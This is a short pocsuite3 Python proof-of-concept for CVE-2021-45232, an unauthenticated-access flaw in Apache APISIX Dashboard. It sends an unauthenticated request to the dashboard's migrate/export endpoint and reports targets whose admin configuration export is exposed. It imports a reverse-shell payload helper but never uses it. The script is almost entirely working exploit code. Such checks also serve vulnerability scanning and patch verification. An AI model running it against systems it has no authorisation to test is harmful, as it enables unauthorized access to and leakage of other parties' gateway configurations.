# -*- coding:utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD

class DemoPOC(POCBase):
    vulID = "CVE-2021-45232"
    version ='1'
    author = ["LMX"]
    vulDate = ""
    createDate = "2022-2-14"
    updateDate = "2022-2-14"
    references =[]
    name ="Apache APISIX Dashboard 接口未授权访问漏洞"
    appPowerLink = ''
    appName = 'Apache APISIX'
    appVersion = '2.7-2.10 '
    vulType = '未授权访问'
    desc = '''
    Apache APISIX Dashboard 接口未授权访问漏洞
    '''

    def _verify(self):
        result ={}
        #path = '''/apisix/admin/tool/version'''
        path_2 = '''/apisix/admin/migrate/export'''
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Connection': 'close'
                    }
        #url = self.url + path
        url_2 = self.url + path_2
        #r = requests.get(url=url,headers=headers,verify=False)
        rr = requests.get(url=url_2,headers=headers,verify=False)
        
        try:
            if '{"Consumers":[]' in rr.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()
register_poc(DemoPOC)
